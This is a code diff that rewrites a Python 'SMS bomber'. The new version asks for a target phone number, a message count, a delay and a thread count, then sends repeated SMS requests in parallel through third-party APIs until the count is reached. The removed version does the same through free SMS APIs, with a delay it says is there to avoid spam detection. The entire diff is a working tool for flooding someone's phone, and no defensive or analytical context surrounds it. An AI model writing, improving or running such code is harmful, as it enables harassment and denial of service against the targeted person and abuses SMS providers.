@@ -1,35 +1,62 @@
-import requests
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
+import os
+import sys
 import time
+import json
+import string
 import random
+import requests
+import argparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from utils.provider import APIProvider
+from utils.decorators import MessageDecorator
 
-# List of free SMS APIs (some may stop working)
-APIS = [
-    "https://textbelt.com/text",
-    "https://api.callmebot.com/sms/send.php",
-    "https://www.fast2sms.com/dev/bulkV2"
-]
+def format_phone(num):
+    return ''.join([n for n in num if n in string.digits]).strip()
 
-def send_sms(phone_number, message, count):
-    for i in range(count):
-        api = random.choice(APIS)  # Randomly select an API
-        data = {
-            "phone": phone_number,
-            "message": message,
-            "key": "free"  # Some APIs require an API key
-        }
+def get_phone_info():
+    while True:
+        cc = input("Enter your country code (Without +): ")
+        cc = format_phone(cc)
+        target = input(f"Enter the target number: +{cc} ")
+        target = format_phone(target)
+        if len(target) < 7 or len(target) > 15:
+            print("Invalid phone number. Please try again.")
+            continue
+        return cc, target
 
-        response = requests.post(api, data=data)
-        if response.status_code == 200:
-            print(f"[+] SMS {i+1}/{count} Sent Successfully via {api}")
-        else:
-            print(f"[-] SMS {i+1}/{count} Failed via {api}")
-        
-        time.sleep(1)  # Add delay to avoid spam detection
+def pretty_print(cc, target, success, failed):
+    print(f"Target: +{cc} {target}")
+    print(f"Successful: {success}")
+    print(f"Failed: {failed}")
 
-# User input
-phone_number = input("📞 Enter target phone number: ")
-message = input("💬 Enter message to send: ")
-count = int(input("🔢 Enter number of messages to send: "))
+def workernode(cc, target, count, delay, max_threads):
+    api = APIProvider(cc, target, "sms")
+    success, failed = 0, 0
 
-# Run SMS Bomber
-send_sms(phone_number, message, count)
+    while success < count:
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            jobs = [executor.submit(api.hit) for _ in range(count - success)]
+            for job in as_completed(jobs):
+                result = job.result()
+                if result:
+                    success += 1
+                else:
+                    failed += 1
+                pretty_print(cc, target, success, failed)
+                time.sleep(delay)
+
+    print("Bombing completed!")
+
+def main():
+    cc, target = get_phone_info()
+    count = int(input("Enter number of SMS to send: "))
+    delay = float(input("Enter delay time (in seconds): "))
+    max_threads = int(input("Enter number of threads: "))
+
+    workernode(cc, target, count, delay, max_threads)
+
+if __name__ == "__main__":
+    main()
